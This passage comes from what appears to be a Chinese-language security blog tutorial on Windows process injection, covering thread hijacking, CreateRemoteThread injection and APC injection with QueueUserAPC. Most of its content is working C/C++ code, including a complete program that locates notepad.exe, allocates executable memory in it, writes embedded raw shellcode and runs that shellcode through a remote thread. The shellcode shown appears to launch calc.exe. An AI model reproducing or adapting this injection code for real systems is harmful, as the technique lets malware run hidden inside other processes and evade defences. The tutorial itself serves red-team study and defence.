class="line">    <span class="comment">// 定义有效载荷（shellcode）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">  	SIZE_T sPayloadSize = <span class="keyword">sizeof</span>(buf); <span class="comment">// 计算有效载荷的大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行线程劫持</span></span><br><span class="line">    <span class="keyword">if</span> (!RunViaClassicThreadHijacking(hThread, buf, sPayloadSize)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;线程劫持失败。\n&quot;</span>);</span><br><span class="line">        CloseHandle(hThread); <span class="comment">// 如果劫持失败，打印错误信息并关闭线程句柄</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 返回 1 表示失败</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复线程以执行有效载荷</span></span><br><span class="line">    <span class="keyword">if</span> (ResumeThread(hThread) == (DWORD)<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;恢复线程失败。\n&quot;</span>);</span><br><span class="line">        CloseHandle(hThread); <span class="comment">// 如果恢复线程失败，打印错误信息并关闭线程句柄</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 返回 1 表示失败</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待线程结束</span></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理资源</span></span><br><span class="line">    CloseHandle(hThread); <span class="comment">// 关闭线程句柄以释放资源</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回 0 表示程序成功结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="远程线程注入-CreateRemoteThread"><a href="#远程线程注入-CreateRemoteThread" class="headerlink" title="远程线程注入-CreateRemoteThread"></a>远程线程注入-CreateRemoteThread</h2><h3 id="什么是进程"><a href="#什么是进程" class="headerlink" title="什么是进程"></a>什么是进程</h3><blockquote>
<p>进程是当前在Windows中运行的软件程序。每个进程都有一个ID，一个标识它的编号。<em>线程</em>是一个标识程序哪个部分正在运行的对象。</p>
</blockquote>
<h3 id="注入进程的步骤"><a href="#注入进程的步骤" class="headerlink" title="注入进程的步骤"></a>注入进程的步骤</h3><ol>
<li>打开目标进程的句柄</li>
<li>在目标进程中分配内存</li>
<li>将Shellcode写入分配的内存</li>
<li>创建远程线程以执行代码</li>
<li>关闭目标进程的句柄</li>
</ol>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/1731027476488.jpg" data-fancybox="true"/></div></div>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="打开目标进程"><a href="#打开目标进程" class="headerlink" title="打开目标进程"></a>打开目标进程</h4><p>首先，我们需要打开具有必要权限的目标进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用必要的权限打开目标进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    wprintf(<span class="string">L&quot;[ERROR] 无法打开进程[%d]\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] 进程打开成功!\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>PROCESS_ALL_ACCESS</code>：进程对象的所有可能的访问权限</li>
<li><code>FALSE</code>:  句柄不可继承</li>
<li><code>pid</code>:  目标进程的进程ID，例如<code>notepad.exe</code></li>
</ul>
<p>进程的句柄存储在hProcess</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241108134148179.png" data-fancybox="true"/></div></div>

<h4 id="为ShellCode分配内存"><a href="#为ShellCode分配内存" class="headerlink" title="为ShellCode分配内存"></a>为ShellCode分配内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">LPVOID pAddress = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pAddress == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    wprintf(<span class="string">L&quot;[ERROR] 无法分配远程内存 [%d]\n&quot;</span>, GetLastError());</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] 内存分配成功!\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hProcess</code>：我们想要分配内存的进程句柄</li>
<li><code>NULL</code>: 为要分配的页面区域指定所需起始地址的指针</li>
<li><code>sizeof(shellcode)</code>: 要分配的内存区域的大小（以字节为单位）</li>
<li><code>MEM_COMMIT | MEM_RESERVE</code>: 内存分配的类型</li>
<li><code>PAGE_EXECUTE_READWRITE</code>: 启用执行、读取和写入访问</li>
</ul>
<p>分配的内存地址存储在pAddress中</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241108132911338.png" data-fancybox="true"/></div></div>

<h4 id="将ShellCode写入内存"><a href="#将ShellCode写入内存" class="headerlink" title="将ShellCode写入内存"></a>将ShellCode写入内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将ShellCode写入到内存</span></span><br><span class="line"><span class="keyword">if</span> (WriteProcessMemory(hProcess, pAddress, shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    wprintf(<span class="string">L&quot;[ERROR] 无法写入远程内存 [%d]\n&quot;</span>, GetLastError());</span><br><span class="line">    VirtualFreeEx(hProcess, pAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">101</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Shellcode已成功写入内存!\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hProcess</code>：要修改的进程内存的句柄。 句柄必须具有对进程的PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限</li>
<li><code>pAddress</code>:  指向将数据写入到的指定进程中基址的指针。 在进行数据传输之前，系统会验证指定大小的基址和内存中的所有数据是否可供写入访问，如果无法访问，则函数将失败</li>
<li><code>shellcode</code>: 要写入的数据(shellcode)</li>
<li><code>sizeof(shellcode)</code>: 要写入指定进程的字节数</li>
<li><code>NULL</code>: 指向变量的指针，该变量接收传输到指定进程的字节数。 此参数是可选的。 如果 lpNumberOfBytesWritten为NULL，则忽略参数</li>
</ul>
<p>如果函数成功，返回值为非零</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241108133412932.png" data-fancybox="true"/></div></div>

<h4 id="创建一个远程线程来执行ShellCode"><a href="#创建一个远程线程来执行ShellCode" class="headerlink" title="创建一个远程线程来执行ShellCode"></a>创建一个远程线程来执行ShellCode</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个远程线程来执行ShellCode</span></span><br><span class="line">HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pAddress, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    wprintf(<span class="string">L&quot;[ERROR] 无法创建远程线程 [%d]\n&quot;</span>, GetLastError());</span><br><span class="line">    VirtualFreeEx(hProcess, pAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">102</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] 远程线程已成功创建!\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hProcess</code>:  要在其中创建线程的进程句柄。 句柄必须具有<code>PROCESS_CREATE_THREAD</code>、 <code>PROCESS_QUERY_INFORMATION</code>、<code>PROCESS_VM_OPERATION</code>、<code>PROCESS_VM_WRITE</code>和 <code>PROCESS_VM_READ</code>访问权限，并且在某些平台上没有这些权限可能会失败</li>
<li><code>NULL</code>:  默认安全描述符</li>
<li><code>0</code>:  新线程使用可执行文件的默认大小</li>
<li><code>(LPTHREAD_START_ROUTINE)pAddress</code>:  线程将从这个地址开始执行</li>
</ul>
<p>返回值将存储在<code>hThread</code>变量中</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241108134104482.png" data-fancybox="true"/></div></div>

<h4 id="等待远程线程完成执行，然后进行清理"><a href="#等待远程线程完成执行，然后进行清理" class="headerlink" title="等待远程线程完成执行，然后进行清理"></a>等待远程线程完成执行，然后进行清理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 等待远程线程完成执行</span></span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Clean up</span></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">VirtualFreeEx(hProcess, pAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">CloseHandle(hProcess);</span><br></pre></td></tr></table></figure>

<p>等待执行完成，然后关闭<code>HANDLE</code>并释放分配的内存并结束进程注入程序。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">wchar_t</span>* notepadProcessName = <span class="string">L&quot;notepad.exe&quot;</span>;</span><br><span class="line">	<span class="comment">// 获取进程快照</span></span><br><span class="line">	HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		PROCESSENTRY32 processEntry = &#123; <span class="built_in">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line">		<span class="comment">// 遍历进程列表</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;processEntry)) &#123;</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="comment">// 检查进程名称是否匹配</span></span><br><span class="line">				<span class="keyword">if</span> (_wcsicmp(processEntry.szExeFile, notepadProcessName) == <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="comment">// 打开进程句柄</span></span><br><span class="line">					HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);</span><br><span class="line">					<span class="keyword">if</span> (hProcess != <span class="literal">NULL</span>) &#123;</span><br><span class="line">						<span class="comment">// 在目标进程中分配一块内存,用于存储shellcode</span></span><br><span class="line">						LPVOID pRemoteMemory = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">						<span class="keyword">if</span> (pRemoteMemory != <span class="literal">NULL</span>) &#123;</span><br><span class="line">							<span class="comment">// 将shellcode写入目标进程内存</span></span><br><span class="line">							<span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteMemory, buf, <span class="built_in">sizeof</span>(buf), <span class="literal">NULL</span>);</span><br><span class="line">							<span class="comment">// 在目标进程中创建一个线程执行shellcode</span></span><br><span class="line">							HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pRemoteMemory, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">							<span class="keyword">if</span> (hThread != <span class="literal">NULL</span>) &#123;</span><br><span class="line">								<span class="comment">// 等待线程执行完成</span></span><br><span class="line">								<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">								<span class="comment">// 清理资源</span></span><br><span class="line">								<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">								<span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="comment">// 关闭进程句柄</span></span><br><span class="line">						<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;processEntry));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 关闭进程快照句柄</span></span><br><span class="line">		<span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="APC注入-QueueUserAPC"><a href="#APC注入-QueueUserAPC" class="headerlink" title="APC注入-QueueUserAPC"></a>APC注入-QueueUserAPC</h2><h3 id="什么是APC"><a href="#什么是APC" class="headerlink" title="什么是APC"></a>什么是APC</h3><blockquote>
<p>Asyncroneus Procedure Call-异步过程调用:</p>
<p>​	在一个特定的线程的上下文中以异步方式执行的功能.当APC排队到线程中时,系统会发出软件中断.下次调度线程时,他将运行APC功能。</p>
<p>​	系统生成的APC称为内核模式APC。由应用程序生成的APC称为用户模式APC</p>
<p>​	<strong>线程必须处于可警报状态才能运行用户模式APC</strong></p>
</blockquote>
<p><font color=red>每个线程都有自己的APC队列.应用程序通过调用QueueUserAPC函数将APC排队到线程中.调用线程对QueueUserAPC的调用中指定APC函数的地址。APC的排队是对线程调用APC函数的请求.</font></p>
<h3 id="什么是APC注入"><a href="#什么是APC注入" class="headerlink" title="什么是APC注入?"></a>什么是APC注入?</h3><p>由于在线程执行过程中,其他线程无法干预当前执行线程(占CPU),如果需要干预当前执行线程的操作,就需要一种<strong>让线程自身去调用的机制,Windows实现了一种称之为APC的技术,这种技术可以通过插入队列(执行信息)让线程在一定条件下自己去调用,这样就实现了异步操作.</strong></p>
<h3 id="什么是APC队列？"><a href="#什么是APC队列？" class="headerlink" title="什么是APC队列？"></a>什么是APC队列？</h3><p>要将 APC 函数排队到线程，必须将 APC 函数的地址传递给QueueUserAPC WinAPI。根据Microsoft 的⽂档：</p>
<blockquote>
<p>应⽤程序通过调⽤<code>QueueUserAPC</code>函数将APC排队到线程.调⽤线程在对<code>QueueUserAPC</code>的调⽤中指定APC函数的地址。</p>
</blockquote>
<p>注入有效载荷的步骤</p>
<ol>
<li><strong>创建目标线程</strong>：<ul>
<li>创建一个新线程，或者找到一个已经存在的线程。</li>
<li>确保线程处于可警告状态。</li>
</ul>
</li>
<li><strong>将有效载荷排队到APC队列</strong>：<ul>
<li>使用 <code>QueueUserAPC</code> 函数将有效载荷函数排队到目标线程的APC队列中。</li>
</ul>
</li>
<li><strong>使线程进入可警告状态</strong>：<ul>
<li>使目标线程调用一个可警告的等待函数，如 <code>SleepEx</code>、<code>SignalObjectAndWait</code>、<code>MsgWaitForMultipleObjectsEx</code>、<code>WaitForMultipleObjectsEx</code> 或 <code>WaitForSingleObjectEx</code>。</li>
</ul>
</li>
<li><strong>执行APC</strong>：<ul>
<li>当线程进入可警告状态时，系统会检查APC队列并执行排队的APC函数。</li>
</ul>
</li>
</ol>
<h4 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">QueueUserAPC</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] PAPCFUNC  pfnAPC,</span></span><br><span class="line"><span class="params">  [in] HANDLE    hThread,</span></span><br><span class="line"><span class="params">  [in] ULONG_PTR dwData</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>pfnAPC</code>: 要调⽤的APC函数的地址</li>
<li><code>hThread</code>: 可警告线程或挂起线程的句柄</li>
<li><code>dwData</code>: 传递给<code>pfnAPC</code>参数指向的APC函数的单个值。</li>
</ol>
<h4 id="将线程置于可警告状态"><a href="#将线程置于可警告状态" class="headerlink" title="将线程置于可警告状态"></a>将线程置于可警告状态</h4><p>执⾏排队函数的线程需要处于可警告状态。这可以通过创建线程并使⽤以下 WinAPI 之⼀来实现：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep">Sleep</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex">SleepEx</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjects">MsgWaitForMultipleObjects</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjectsex">MsgWaitForMultipleObjectsEx</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobjectex">WaitForSingleObjectEx</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjects">WaitForMultipleObjects</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjectsex">WaitForMultipleObjectsEx</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-signalobjectandwait">SignalObjectAndWait</a></li>
</ul>
<p>这些函数用于同步线程并提高应用程序的性能和响应能力。在这种情况下，只需将一个虚拟事件的句柄传递给这些函数之一，即可将线程置于可警告状态。无需将正确的参数传递给这些函数，因为任何有效的事件句柄都可以达到目的。</p>
<p>要创建虚拟事件，可以使用 <code>CreateEvent</code> WinAPI。新创建的事件对象是一个同步对象，允许线程通过发信号和等待事件来相互通信。由于 <code>CreateEvent</code> 的输出在此场景中无关紧要，因此可以传递任何有效的事件句柄给前面提到的 WinAPI 函数。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><h5 id="Sleep"><a href="#Sleep" class="headerlink" title="Sleep"></a>Sleep</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">AlertableFunction1</span><span class="params">()</span> &#123;</span><br><span class="line">	Sleep(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="SleepEx"><a href="#SleepEx" class="headerlink" title="SleepEx"></a>SleepEx</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">AlertableFunction2</span><span class="params">()</span> &#123;</span><br><span class="line"> SleepEx(INFINITE, TRUE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">AlertableFunction3</span><span class="params">()</span> &#123;</span><br><span class="line"> HANDLE hEvent = CreateEvent(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (hEvent)&#123;</span><br><span class="line"> WaitForSingleObject(hEvent, INFINITE);</span><br><span class="line"> CloseHandle(hEvent);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

